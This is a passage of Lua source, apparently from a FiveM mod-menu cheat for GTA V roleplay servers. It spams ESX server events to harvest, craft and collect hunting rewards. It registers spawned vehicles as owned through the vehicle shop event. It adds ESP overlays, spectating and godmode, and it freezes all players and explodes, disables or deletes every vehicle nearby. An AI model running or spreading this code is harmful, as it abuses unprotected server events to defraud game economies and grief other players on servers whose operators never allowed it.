    TriggerServerEvent('esx_mechanicjob:startHarvest2')
    TriggerServerEvent('esx_mechanicjob:startHarvest2')
    TriggerServerEvent('esx_mechanicjob:startHarvest2')
    TriggerServerEvent('esx_mechanicjob:startHarvest2')
end

function craftrepairkits()
    TriggerServerEvent('esx_mechanicjob:startCraft2')
    TriggerServerEvent('esx_mechanicjob:startCraft2')
    TriggerServerEvent('esx_mechanicjob:startCraft2')
    TriggerServerEvent('esx_mechanicjob:startCraft2')
end

function harvestbodykits()
    TriggerServerEvent('esx_mechanicjob:startHarvest3')
    TriggerServerEvent('esx_mechanicjob:startHarvest3')
    TriggerServerEvent('esx_mechanicjob:startHarvest3')
    TriggerServerEvent('esx_mechanicjob:startHarvest3')
end

function craftbodykits()
    TriggerServerEvent('esx_mechanicjob:startCraft3')
    TriggerServerEvent('esx_mechanicjob:startCraft3')
    TriggerServerEvent('esx_mechanicjob:startCraft3')
    TriggerServerEvent('esx_mechanicjob:startCraft3')
end

function matanumaispalarufe()
    TriggerServerEvent('esx_drugs:stopHarvestCoke')
    TriggerServerEvent('esx_illegal_drugs:stopHarvestCoke')
    TriggerServerEvent('esx_drugs:stopTransformCoke')
    TriggerServerEvent('esx_illegal_drugs:stopTransformCoke')
    TriggerServerEvent('esx_drugs:stopSellCoke')
    TriggerServerEvent('esx_illegal_drugs:stopSellCoke')
    TriggerServerEvent('esx_drugs:stopHarvestMeth')
    TriggerServerEvent('esx_illegal_drugs:stopHarvestMeth')
    TriggerServerEvent('esx_drugs:stopTransformMeth')
    TriggerServerEvent('esx_illegal_drugs:stopTransformMeth')
    TriggerServerEvent('esx_drugs:stopSellMeth')
    TriggerServerEvent('esx_illegal_drugs:stopSellMeth')
    TriggerServerEvent('esx_drugs:stopHarvestWeed')
    TriggerServerEvent('esx_illegal_drugs:stopHarvestWeed')
    TriggerServerEvent('esx_drugs:stopTransformWeed')
    TriggerServerEvent('esx_illegal_drugs:stopTransformWeed')
    TriggerServerEvent('esx_drugs:stopSellWeed')
    TriggerServerEvent('esx_illegal_drugs:stopSellWeed')
    TriggerServerEvent('esx_drugs:stopHarvestOpium')
    TriggerServerEvent('esx_illegal_drugs:stopHarvestOpium')
    TriggerServerEvent('esx_drugs:stopTransformOpium')
    TriggerServerEvent('esx_illegal_drugs:stopTransformOpium')
    TriggerServerEvent('esx_drugs:stopSellOpium')
    TriggerServerEvent('esx_illegal_drugs:stopSellOpium')
    TriggerServerEvent('esx_bitcoin:stopHarvestKoda')
    TriggerServerEvent('esx_bitcoin:stopSellKoda')
    TriggerServerEvent('esx_mechanicjob:stopHarvest')
    TriggerServerEvent('esx_mechanicjob:stopCraft')
    TriggerServerEvent('esx_mechanicjob:stopHarvest2')
    TriggerServerEvent('esx_mechanicjob:stopCraft2')
    TriggerServerEvent('esx_mechanicjob:stopHarvest3')
    TriggerServerEvent('esx_mechanicjob:stopCraft3')
    TriggerServerEvent('esx_poolcleaner:stopVente')
    av('~w~Everything is now stopped.', false)
end

local function doText(numLetters)
    local totTxt = ""
    for i = 1,numLetters do
        totTxt = totTxt..string.char(math.random(65,90))
    end
    print(totTxt)
end

local function freevehc1()
    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
    local cw = KeyboardInput('Enter Vehicle Licence Plate', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        pizda(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        local veh =
            CreateVehicle(
            GetHashKey(cb),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
            true
        )
        if cw then
            SetVehicleNumberPlateText(veh, cw)
            local cx = ESX.Game.GetVehicleProperties(veh)
            TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
            av('~g~~h~Success', false)
        else
            SetVehicleNumberPlateText(veh, doText(3)..' '..math.random(100,999))
            local cx = ESX.Game.GetVehicleProperties(veh)
            TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
            av('~g~~h~Success', false)
        end
    else
        av('~w~~h~Model is not valid !', true)
    end
end

function daojosdinpatpemata()
    local ax = GetPlayerPed(-1)
    local ay = GetVehiclePedIsIn(ax, true)
    if
        IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
            GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
     then
        SetVehicleOnGroundProperly(ay)
        av('~g~Vehicle Flipped!', false)
    else
        av("~w~You Aren't In The Driverseat Of A Vehicle!", true)
    end
end

function stringsplit(cy, cz)
    if cz == nil then
        cz = '%s'
    end
    local cA = {}
    i = 1
    for cB in string.gmatch(cy, '([^' .. cz .. ']+)') do
        cA[i] = cB
        i = i + 1
    end
    return cA
end
local cC = false

function SpectatePlayer(cD)
    local ax = PlayerPedId(-1)
    cC = not cC
    local cE = GetPlayerPed(cD)
    if cC then
        local cF, cG, cH = table.unpack(GetEntityCoords(cE, false))
        RequestCollisionAtCoord(cF, cG, cH)
        NetworkSetInSpectatorMode(true, cE)
        av('~h~~g~Spectujesz ~h~~w~: ~h~~p~' .. GetPlayerName(SelectedPlayer) .. ' ')
    else
        local cF, cG, cH = table.unpack(GetEntityCoords(cE, false))
        RequestCollisionAtCoord(cF, cG, cH)
        NetworkSetInSpectatorMode(false, cE)
        av('~h~~g~Przestales spectowac ~h~~w~: ~h~~p~' .. GetPlayerName(SelectedPlayer) .. ' ')
    end
end

function ShootPlayer(cD)
    local head = GetPedBoneCoords(cD, GetEntityBoneIndexByName(cD, 'SKEL_HEAD'), 0.0, 0.0, 0.0)
    SetPedShootsAtCoord(PlayerPedId(-1), head.x, head.y, head.z, true)
end

function MaxOut(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        0,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        1,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        2,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        3,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        4,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        5,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        6,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        7,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        8,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        9,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        10,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        11,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        12,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        13,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1,
        false
    )
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        15,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        16,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1,
        false
    )
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        25,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        27,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        28,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        30,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        33,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        34,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        35,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        38,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1,
        true
    )
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
    SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 0, true)
    SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 1, true)
    SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 2, true)
    SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 3, true)
    SetVehicleNeonLightsColour(GetVehiclePedIsIn(GetPlayerPed(-1)), 222, 222, 255)
end

function DelVeh(veh)
    SetEntityAsMissionEntity(Object, 1, 1)
    DeleteEntity(Object)
    SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
    DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
end

function Clean(veh)
    SetVehicleDirtLevel(veh, 15.0)
end

function Clean2(veh)
    SetVehicleDirtLevel(veh, 1.0)
end

function RequestControl(entity)
    local cI = 0
    NetworkRequestControlOfEntity(entity)
    while not NetworkHasControlOfEntity(entity) do
        cI = cI + 100
        Citizen.Wait(100)
        if cI > 5000 then
            av('Hung for 5 seconds, killing to prevent issues...', true)
        end
    end
end

function getEntity(cD)
    local m, entity = GetEntityPlayerIsFreeAimingAt(cD, Citizen.ReturnResultAnyway())
    return entity
end

function GetInputMode()
    return Citizen.InvokeNative(0xA571D46727E2B718, 2) and 'MouseAndKeyboard' or 'GamePad'
end

function DrawSpecialText(cJ, cK)
    SetTextEntry_2('STRING')
    AddTextComponentString(cJ)
    DrawSubtitleTimed(cK, 1)
end
local cL = true
local cM = false
local cN = true
local cO = true

Citizen.CreateThread(
    function()
        while true do
            Wait(1)
            for f = 0, 128 do
                if NetworkIsPlayerActive(f) and GetPlayerPed(f) ~= GetPlayerPed(-1) then
                    ped = GetPlayerPed(f)
                    blip = GetBlipFromEntity(ped)
                    x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                    x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true))
                    distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                    headId = Citizen.InvokeNative(0xBFEFE3321A3F5015, ped, GetPlayerName(f), false, false, '', false)
                    wantedLvl = GetPlayerWantedLevel(f)
                    if cM then
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, true)
                        if wantedLvl then
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, true)
                            Citizen.InvokeNative(0xCF228E2AA03099C3, headId, wantedLvl)
                        else
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        end
                    else
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 9, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, false)
                    end
                    if cL then
                        if not DoesBlipExist(blip) then
                            blip = AddBlipForEntity(ped)
                            SetBlipSprite(blip, 1)
                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                            SetBlipNameToPlayerName(blip, f)
                        else
                            veh = GetVehiclePedIsIn(ped, false)
                            blipSprite = GetBlipSprite(blip)
                            if not GetEntityHealth(ped) then
                                if blipSprite ~= 274 then
                                    SetBlipSprite(blip, 274)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                            elseif veh then
                                vehClass = GetVehicleClass(veh)
                                vehModel = GetEntityModel(veh)
                                if vehClass == 15 then
                                    if blipSprite ~= 422 then
                                        SetBlipSprite(blip, 422)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif vehClass == 16 then
                                    if
                                        vehModel == GetHashKey('besra') or vehModel == GetHashKey('hydra') or
                                            vehModel == GetHashKey('lazer')
                                     then
                                        if blipSprite ~= 424 then
                                            SetBlipSprite(blip, 424)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                            SetBlipNameToPlayerName(blip, f)
                                        end
                                    elseif blipSprite ~= 423 then
                                        SetBlipSprite(blip, 423)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif vehClass == 14 then
                                    if blipSprite ~= 427 then
                                        SetBlipSprite(blip, 427)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif
                                    vehModel == GetHashKey('insurgent') or vehModel == GetHashKey('insurgent2') or
                                        vehModel == GetHashKey('limo2')
                                 then
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(blip, 426)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif vehModel == GetHashKey('rhino') then
                                    if blipSprite ~= 421 then
                                        SetBlipSprite(blip, 421)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                                passengers = GetVehicleNumberOfPassengers(veh)
                                if passengers then
                                    if not IsVehicleSeatFree(veh, -1) then
                                        passengers = passengers + 1
                                    end
                                    ShowNumberOnBlip(blip, passengers)
                                else
                                    HideNumberOnBlip(blip)
                                end
                            else
                                HideNumberOnBlip(blip)
                                if blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                            end
                            SetBlipRotation(blip, math.ceil(GetEntityHeading(veh)))
                            SetBlipNameToPlayerName(blip, f)
                            SetBlipScale(blip, 0.85)
                            if IsPauseMenuActive() then
                                SetBlipAlpha(blip, 255)
                            else
                                x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true))
                                distance =
                                    math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1) +
                                    900
                                if distance < 0 then
                                    distance = 0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(blip, distance)
                            end
                        end
                    else
                        RemoveBlip(blip)
                    end
                end
            end
        end
    end
)
local cP = {
    __gc = function(cQ)
        if cQ.destructor and cQ.handle then
            cQ.destructor(cQ.handle)
        end
        cQ.destructor = nil
        cQ.handle = nil
    end
}

function EnumerateEntities(cR, cS, cT)
    return coroutine.wrap(
        function()
            local cU, f = cR()
            if not f or f == 0 then
                cT(cU)
                return
            end
            local cQ = {
                handle = cU,
                destructor = cT
            }
            setmetatable(cQ, cP)
            local cV = true
            repeat
                coroutine.yield(f)
                cV, f = cS(cU)
            until not cV
            cQ.destructor, cQ.handle = nil, nil
            cT(cU)
        end
    )
end

function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

function EnumerateVehicles()
    return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

function EnumerateObjects()
    return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
end

function RotationToDirection(cW)
    local cX = cW.z * 0.0174532924
    local cY = cW.x * 0.0174532924
    local cZ = math.abs(math.cos(cY))
    return vector3(-math.sin(cX) * cZ, math.cos(cX) * cZ, math.sin(cY))
end

function OscillateEntity(entity, c_, d0, d1, d2)
    if entity ~= 0 and entity ~= nil then
        local d3 = (d0 - c_) * d1 * d1 - 2.0 * d1 * d2 * GetEntityVelocity(entity)
        ApplyForceToEntity(entity, 3, d3.x, d3.y, d3.z + 0.1, 0.0, 0.0, 0.0, false, false, true, true, false, true)
    end
end
local d4 = true
Citizen.CreateThread(
    function()
        while bw do
            Citizen.Wait(0)
            SetPlayerInvincible(PlayerId(), Godmode)
            SetEntityInvincible(PlayerPedId(-1), Godmode)
            SetEntityVisible(GetPlayerPed(-1), d4, 0)
            if SuperJump then
                SetSuperJumpThisFrame(PlayerId(-1))
            end
            if InfStamina then
                RestorePlayerStamina(PlayerId(-1), 1.0)
            end
            if fastrun then
                SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49)
                SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
            else
                SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
                SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
            end
            if VehicleGun then
                local d5 = 'Freight'
                local c0 = GetEntityCoords(GetPlayerPed(-1), true)
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then
                    av('~g~Vehicle Gun Enabled!~n~~w~Use The ~w~AP Pistol~n~~w~Aim ~w~and ~w~Shoot!', false)
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_APPISTOL'), 999999, false, true)
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey('WEAPON_APPISTOL'), 999999)
                    if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey('WEAPON_APPISTOL') then
                        if IsPedShooting(GetPlayerPed(-1)) then
                            while not HasModelLoaded(GetHashKey(d5)) do
                                Citizen.Wait(0)
                                pizda(GetHashKey(d5))
                            end
                            local veh =
                                CreateVehicle(
                                GetHashKey(d5),
                                c0.x + 5 * GetEntityForwardX(GetPlayerPed(-1)),
                                c0.y + 5 * GetEntityForwardY(GetPlayerPed(-1)),
                                c0.z + 2.0,
                                GetEntityHeading(GetPlayerPed(-1)),
                                true,
                                true
                            )
                            SetEntityAsNoLongerNeeded(veh)
                            SetVehicleForwardSpeed(veh, 150.0)
                        end
                    end
                end
            end
            if DeleteGun then
                local d6 = getEntity(PlayerId(-1))
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then
                    av('~g~Delete Gun Enabled!~n~~w~Use The ~w~Pistol~n~~w~Aim ~w~and ~w~Shoot ~w~To Delete!')
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999, false, true)
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999)
                    if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey('WEAPON_PISTOL') then
                        if IsPlayerFreeAiming(PlayerId(-1)) then
                            if IsEntityAPed(d6) then
                                if IsPedInAnyVehicle(d6, true) then
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(GetVehiclePedIsIn(d6, true), 1, 1)
                                        DeleteEntity(GetVehiclePedIsIn(d6, true))
                                        SetEntityAsMissionEntity(d6, 1, 1)
                                        DeleteEntity(d6)
                                        av('~g~Deleted!')
                                    end
                                else
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(d6, 1, 1)
                                        DeleteEntity(d6)
                                        av('~g~Deleted!')
                                    end
                                end
                            else
                                if IsControlJustReleased(1, 142) then
                                    SetEntityAsMissionEntity(d6, 1, 1)
                                    DeleteEntity(d6)
                                    av('~g~Deleted!')
                                end
                            end
                        end
                    end
                end
            end
            if fuckallcars then
                for ay in EnumerateVehicles() do
                    if not IsPedAPlayer(GetPedInVehicleSeat(ay, -1)) then
                        SetVehicleHasBeenOwnedByPlayer(ay, false)
                        SetEntityAsMissionEntity(ay, false, false)
                        StartVehicleAlarm(ay)
                        DetachVehicleWindscreen(ay)
                        SmashVehicleWindow(ay, 0)
                        SmashVehicleWindow(ay, 1)
                        SmashVehicleWindow(ay, 2)
                        SmashVehicleWindow(ay, 3)
                        SetVehicleTyreBurst(ay, 0, true, 1000.0)
                        SetVehicleTyreBurst(ay, 1, true, 1000.0)
                        SetVehicleTyreBurst(ay, 2, true, 1000.0)
                        SetVehicleTyreBurst(ay, 3, true, 1000.0)
                        SetVehicleTyreBurst(ay, 4, true, 1000.0)
                        SetVehicleTyreBurst(ay, 5, true, 1000.0)
                        SetVehicleTyreBurst(ay, 4, true, 1000.0)
                        SetVehicleTyreBurst(ay, 7, true, 1000.0)
                        SetVehicleDoorBroken(ay, 0, true)
                        SetVehicleDoorBroken(ay, 1, true)
                        SetVehicleDoorBroken(ay, 2, true)
                        SetVehicleDoorBroken(ay, 3, true)
                        SetVehicleDoorBroken(ay, 4, true)
                        SetVehicleDoorBroken(ay, 5, true)
                        SetVehicleDoorBroken(ay, 6, true)
                        SetVehicleDoorBroken(ay, 7, true)
                        SetVehicleLights(ay, 1)
                        Citizen.InvokeNative(0x1FD09E7390A74D54, ay, 1)
                        SetVehicleNumberPlateTextIndex(ay, 5)
                        SetVehicleNumberPlateText(ay, 'AlphaV')
                        SetVehicleDirtLevel(ay, 10.0)
                        SetVehicleModColor_1(ay, 1)
                        SetVehicleModColor_2(ay, 1)
                        SetVehicleCustomPrimaryColour(ay, 255, 51, 255)
                        SetVehicleCustomSecondaryColour(ay, 255, 51, 255)
                        SetVehicleBurnout(ay, true)
                    end
                end
            end
            if destroyvehicles then
                for vehicle in EnumerateVehicles() do
                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
                        NetworkRequestControlOfEntity(vehicle)
                        SetVehicleUndriveable(vehicle, true)
                        SetVehicleEngineHealth(vehicle, 0)
                    end
                end
            end
            if explodevehicles then
                for vehicle in EnumerateVehicles() do
                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
                        NetworkRequestControlOfEntity(vehicle)
                        NetworkExplodeVehicle(vehicle, true, true, false)
                    end
                end
            end
            if huntspam then
                Citizen.Wait(50)
                TriggerServerEvent('esx-qalle-hunting:reward', 50)
                TriggerServerEvent('esx-qalle-hunting:sell')
            end
            if deletenearestvehicle then
                for vehicle in EnumerateVehicles() do
                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
                        SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle, true), 1, 1)
                        DeleteEntity(GetVehiclePedIsIn(vehicle, true))
                        SetEntityAsMissionEntity(vehicle, 1, 1)
                        DeleteEntity(vehicle)
                    end
                end
            end
            if freezeplayer then
                ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
            end
            if freezeall then
                for i = 0, 128 do
                    ClearPedTasksImmediately(GetPlayerPed(i))
                end
            end
            if esp then
                for i = 0, 128 do
                    if i ~= PlayerId(-1) and GetPlayerServerId(i) ~= 0 then
                        local a8 = k(1.0)
                        local d7 = GetPlayerPed(i)
                        local d8, d9, da = table.unpack(GetEntityCoords(PlayerPedId(-1)))
                        local x, y, z = table.unpack(GetEntityCoords(d7))
                        local db =
                            '~h~Name: ' ..
                            GetPlayerName(i) ..
                                '\nServer ID: ' ..
                                    GetPlayerServerId(i) ..
                                        '\nPlayer ID: ' ..
                                            i ..
                                                '\nDist: ' ..
                                                    math.round(GetDistanceBetweenCoords(d8, d9, da, x, y, z, true), 1)
                        if IsPedInAnyVehicle(d7, true) then
                            local dc =
                                GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(d7))))
                            db = db .. '\nVeh: ' .. dc
                        end
                        if espinfo and esp then
                            DrawText3D(x, y, z - 1.0, db, a8.r, a8.g, a8.b)
                        end
                        if espbox and esp then
                            LineOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
                            LineOneEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
                            LineTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
                            LineTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
                            LineThreeBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
                            LineThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, -0.9)
                            LineFourBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
                            TLineOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
                            TLineOneEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
                            TLineTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
                            TLineTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
                            TLineThreeBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
                            TLineThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, 0.8)
                            TLineFourBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
                            ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, 0.8)
                            ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, -0.9)
                            ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
                            ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
                            ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
                            ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
                            ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
                            ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
                            DrawLine(
                                LineOneBegin.x,
                                LineOneBegin.y,
                                LineOneBegin.z,
                                LineOneEnd.x,
                                LineOneEnd.y,
                                LineOneEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                LineTwoBegin.x,
                                LineTwoBegin.y,
                                LineTwoBegin.z,
                                LineTwoEnd.x,
                                LineTwoEnd.y,
                                LineTwoEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                LineThreeBegin.x,
                                LineThreeBegin.y,
                                LineThreeBegin.z,
                                LineThreeEnd.x,
                                LineThreeEnd.y,
                                LineThreeEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
